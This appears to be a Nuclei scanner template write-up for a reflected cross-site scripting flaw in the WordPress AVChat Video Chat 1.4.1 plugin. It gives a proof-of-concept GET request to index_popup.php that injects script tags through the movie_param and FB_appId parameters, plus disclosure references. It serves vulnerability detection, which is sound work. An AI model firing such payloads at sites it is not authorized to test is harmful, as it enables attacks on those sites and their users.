# Nuclei Template: WordPress AVChat Video Chat 1.4.1 - Cross-Site Scripting
**Template ID:** avchat-video-chat-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`avchat-video-chat-xss.yaml`)

## Vulnerability Information & PoC

## Description
WordPress AVChat Video Chat 1.4.1 is vulnerable to reflected cross-site scripting via index_popup.php and multiple parameters.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/wp-content/plugins/avchat-3/index_popup.php?movie_param=%3C/script%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&FB_appId=FB_appId%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E&
```

## References
- https://codevigilant.com/disclosure/wp-plugin-avchat-3-a3-cross-site-scripting-xss/
- https://wpscan.com/vulnerability/fce99c82-3958-4c17-88d3-6e8fa1a11e59
